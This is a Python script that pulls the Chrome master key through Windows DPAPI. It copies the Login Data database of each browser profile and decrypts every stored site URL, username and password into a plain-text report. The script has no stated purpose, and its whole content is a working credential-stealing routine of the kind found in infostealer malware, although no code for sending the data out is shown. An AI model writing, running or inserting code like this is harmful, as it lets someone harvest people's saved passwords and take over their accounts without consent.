import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

def get_master_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        r"AppData\Local\Google\Chrome\User Data\Local State"
    )
    if not os.path.exists(local_state_path):
        raise FileNotFoundError("Local State file not found.")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted_pass = cipher.decrypt(payload)[:-16]  # remove GCM tag

        # Try decoding
        for encoding in ['utf-8', 'latin1', 'windows-1252']:
            try:
                return decrypted_pass.decode(encoding)
            except UnicodeDecodeError:
                continue

        # If no decoding works, return as hex string
        return f"[raw bytes] {decrypted_pass.hex()}"
    except Exception as e:
        return f"[decryption error] {str(e)}"

def extract_all_passwords():
    global login_db_path
    results = ""
    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 6)]
    master_key = get_master_key()
    found_any = False

    for profile in profiles:
        login_db_path = os.path.join(
            os.environ["USERPROFILE"],
            f"AppData\\Local\\Google\\Chrome\\User Data\\{profile}\\Login Data"
        )
        if not os.path.exists(login_db_path):
            continue  # Try next profile

        temp_path = "Loginvault.db"
        try:
            shutil.copy2(login_db_path, temp_path)
        except Exception as e:
            results += f"[!] Failed to copy DB for {profile}: {e}\n{'-'*40}\n"
            continue

        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            conn.close()
        except Exception as e:
            results += f"[!] Failed to read DB for {profile}: {e}\n{'-'*40}\n"
            continue
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)

        if not rows:
            results += f"[i] No passwords found in profile: {profile}\n{'-'*40}\n"
            continue

        found_any = True
        results += f"\n=== Profile: {profile} ===\n\n"
        for url, username, encrypted_password in rows:
            if encrypted_password:
                password = decrypt_password(encrypted_password, master_key)
            else:
                password = "(Empty)"
            results += f"URL: {url}\nUsername: {username}\nPassword: {password}\n{'-'*40}\n"

    if not found_any:
        results += "No passwords were found in any profile.\n"

    return results,login_db_path

